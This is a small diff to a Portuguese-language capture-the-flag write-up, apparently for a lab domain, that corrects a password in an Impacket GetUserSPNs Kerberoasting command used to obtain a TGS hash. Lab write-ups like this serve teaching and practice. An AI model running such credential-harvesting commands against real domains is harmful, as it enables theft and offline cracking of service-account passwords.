@@ -280,7 +280,7 @@ Change password from Password123!
 Com o usuário **contractor-temp**, foi possível realizar um ataque **Kerberoasting** utilizando ferramentas do **Impacket**.
 
 ```
-impacket-GetUserSPNs LAB.ENTERPRISE.THM/contractor-temp:'Change password from Password123!' -dc-ip enterprise.thm -request
+impacket-GetUserSPNs LAB.ENTERPRISE.THM/contractor-temp:Password123! -dc-ip enterprise.thm -request
 ```
 
 Esse comando permitiu obter um **hash Kerberos do tipo TGS**.
